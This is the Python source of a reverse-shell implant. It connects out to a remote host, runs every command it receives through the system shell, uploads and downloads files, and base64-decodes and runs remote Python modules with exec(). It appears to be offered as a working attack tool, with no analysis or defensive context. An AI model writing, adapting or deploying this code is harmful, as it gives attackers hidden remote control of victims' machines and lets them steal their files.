#!/usr/bin/env python
#!/usr/bin/env python
import os, sys, re, signal
import socket
import time
from base64 import *
from subprocess import Popen,PIPE,STDOUT,call
import platform

socksize = 4096                            
activePID = []
Home_Dir = os.environ['HOME']
if os.geteuid() != 0:
    currentuser = "nonroot"
else:
    currentuser = "root"


def module_handler(module, modname):
    status_msg("[~] Module: %s\n" % modname)
    exec(module)
    connection.send("shell => ")


def status_msg(message):
    connection.send("%s" % message)


def cat_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        catfile = open(filename, "rb")
        connection.send("[*] Contents of %s" % filename)
        for lines in catfile.readlines():
            connection.sendall(lines)
        catfile.close()


def save_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        savefile = open(filename, "rb")
        filedata = savefile.read()
        savefile.close()
        connection.send(":savef %s" % filename)
        time.sleep(2)
        connection.sendall( filedata )
    else:
        pass


def cmd_exec(command):
    proc = Popen(command,
              shell=True,
              stdout=PIPE,
              stderr=PIPE,
               stdin=PIPE,
               )
    stdout, stderr = proc.communicate()
    connection.sendall( stdout )


def cmd2txt(command, textfile):
    os.system("%s > %s" % (command, textfile))
    save_file(textfile)
    os.system("rm %s" % textfile)


def main(HOST, PORT):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        connection.connect((HOST, PORT))
        connection.send("shell => ")
    except:
        sys.exit(2)
    
    while True:
        cmd = connection.recv(socksize)
        proc = Popen(cmd,
                shell=True,
                stdout=PIPE,
                stderr=PIPE,
                stdin=PIPE,
                )
        stdout, stderr = proc.communicate()

        if cmd.startswith('cd'):
            try:
                destination = cmd[3:].replace('\n','')
                if os.path.isdir(destination):
                    os.chdir(destination)
                    current = os.getcwd()
                    connection.send("[*] current directory: %s" % current)
                    connection.send("shell => ")
                else:
                    connection.send("[!] Directory does not exist") 
                    connection.send("shell => ")
            except IndexError:
                pass
            
        if cmd.startswith(":upload"):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = connection.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                connection.send("[*] File upload complete!")
            if not os.path.isfile(filename):
                connection.send("[!] File upload failed! Please try again")

        elif cmd.startswith(":download"):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                connection.sendall(filedata)
            else:
                connection.send("[!] File not found!")
    
        elif cmd.startswith(":exec"):
            try:
                getname = cmd.split(" ")
                modname = getname[1]
    
                mod_data = ""
                data = connection.recv(socksize)
                mod_data += data
                connection.send("Complete")     # sends OK msg to the client
                modexec = b64decode(mod_data)   # decode the received file
                module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
    
            except IndexError:
                pass

        elif cmd == (":quit"):
            connection.close()
            os._exit(0)
            sys.exit(0)

        elif proc:
            connection.send( stdout )
            connection.send("shell => ")

    connection.close() 
    sys.exit(0)


